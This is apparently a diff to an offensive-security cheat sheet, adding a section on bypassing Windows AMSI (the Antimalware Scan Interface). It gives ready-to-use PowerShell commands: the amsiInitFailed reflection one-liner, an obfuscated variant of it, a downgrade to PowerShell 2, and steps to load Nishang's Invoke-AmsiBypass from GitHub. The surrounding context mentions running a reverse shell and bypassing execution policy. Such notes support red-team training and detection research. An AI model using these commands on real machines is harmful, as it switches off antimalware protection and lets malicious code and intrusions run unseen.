@@ -34,11 +34,49 @@ You can also execute a reverseshell as the new user
 		powershell -c <cmd>
 		powershell -encodedcommand $env:PSExecutionPolicyPreference="bypass"
 
-### Bypass AMSI
+## Bypass AMSI
+
+AMSI is short for Antimalware Scan Interface.
+
+The goal of AMSI is to prevent the execution of arbitrary code containing malicious content.
+
+### Basic - Forcing an AMSI Initialization Failure
+
+Likely detectable
+
+`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`
+
+### Obfuscated Command
 
 ```
 sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
+
+### Downgrading PowerShell
+
+`powershell.exe -version 2`
+
+`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 2`
+
+checking version
+
+`$PSVersionTable`
+
+
+### Nishang
+
+https://raw.githubusercontent.com/samratashok/nishang/master/Bypass/Invoke-AmsiBypass.ps1
+
+`. .\Invoke-AmsiBypass.ps1`
+
+Or copy the code from github and paste it directly into the powershell console
+
+`Invoke-AmsiBypass -Verbose`
+
+### AMSITrigger - Find Detectable Strings
+
+`https://github.com/RythmStick/AMSITrigger`
+
 
 ## Machine Enumeration
 
